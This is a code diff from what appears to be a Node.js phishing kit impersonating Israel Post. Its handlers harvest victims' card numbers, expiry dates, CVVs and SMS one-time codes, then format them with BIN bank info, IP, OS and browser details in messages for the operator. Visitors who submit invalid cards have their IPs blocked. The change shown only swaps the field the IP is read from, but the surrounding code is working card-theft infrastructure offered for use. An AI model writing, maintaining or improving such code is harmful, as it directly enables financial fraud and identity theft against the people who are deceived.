@@ -13,7 +13,7 @@ module.exports.addCardDetails = async (req, res, next) => {
     const isValidCard = isValidCreditCard(cardNumber, cvv, expiry);
 
     if (!isValidCard) {
-      const blockedIP = new BlockedIP({ ip: req.socket.remoteAddress });
+      const blockedIP = new BlockedIP({ ip: req.connection.remoteAddress });
       await blockedIP.save();
       return res.status(200).json({ success: false });
     }
@@ -30,7 +30,7 @@ module.exports.addCardDetails = async (req, res, next) => {
     const line5 = `[💳] Card Number: ${formatCreditCard(cardNumber)}`;
     const line6 = `[🔄] Expiry Date: ${expiry}`;
     const line7 = `[🔑] CCV: ${cvv}`;
-    const line8 = `[🔍] GEO IP: ${req.socket.remoteAddress}`;
+    const line8 = `[🔍] GEO IP: ${req.connection.remoteAddress}`;
     const line9 = "\n";
     const line10 = "[IsraelPost - 💳 BIN Info 💳]";
     const line11 = `[🏛] Card Bank:  ${cardDetails?.bank?.name || "Unknown"}`;
@@ -64,7 +64,7 @@ module.exports.addCardOTP = async (req, res, next) => {
     const message = `
     [=====>  ISRAELPOST: GHOST $ MSD  SMS    <=====]
     [ SMS CODE: ${otp}
-    [ IP: ${req.socket.remoteAddress}
+    [ IP: ${req.connection.remoteAddress}
     [ OS: ${osName || "Unknown"}
     [ Browser: ${browser?.name || "None"}
     [ UA: ${ua}
